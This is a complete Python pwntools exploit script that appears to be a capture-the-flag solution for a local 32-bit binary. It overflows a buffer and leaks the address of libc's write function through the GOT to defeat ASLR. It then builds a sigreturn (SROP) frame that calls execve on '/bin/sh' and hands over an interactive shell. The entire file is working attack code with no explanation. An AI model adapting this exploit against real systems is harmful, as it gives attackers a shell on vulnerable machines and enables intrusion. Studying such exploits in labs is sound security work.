from pwn import *
import sys

def exploit():
	p1 =  cyclic(268)
	p1 += flat(elf.plt['write'], p3r, 1, elf.got['write'], 4)
	p1 += flat(elf.sym['main'])

	p.sendline(p1)

	leak = u32(p.recv()[0x100:0x104])
	libc.address = leak - libc.sym['write']

	log.info('libc :       0x%x' % libc.address)
	log.info('ksigreturn : 0x%x' % (libc.address+ksigreturn))

	p2 =  cyclic(268)
	p2 += p32(libc.address + ksigreturn)
	p2 += p32(0)

	frame = SigreturnFrame(kernel = 'amd64')
	frame.eax = constants.SYS_execve
	frame.ebx = next(libc.search('/bin/sh'))
	frame.esp = libc.address + syscall
	frame.eip = libc.address + syscall

	p2 += str(frame)

	p.sendline(p2)
	p.interactive()

def main():
	global b, l, elf, libc, p, p1r, p3r, ksigreturn, syscall

	# context.log_level = 'debug'
	context.arch = 'i386'

	b    = './binary'
	l    = './libc.so.6'
	elf  = ELF(b)
	libc = ELF(l)
	# p = process(b)
	p = process(b, env={'LD_PRELOAD' : l})
	# p = remote('localhost', 8888)

	p1r = 0x08048727
	p3r = 0x08048639
	ksigreturn = 0x1e2070
	syscall    = 0x1e2076

	exploit()

if __name__ == '__main__':
	main()
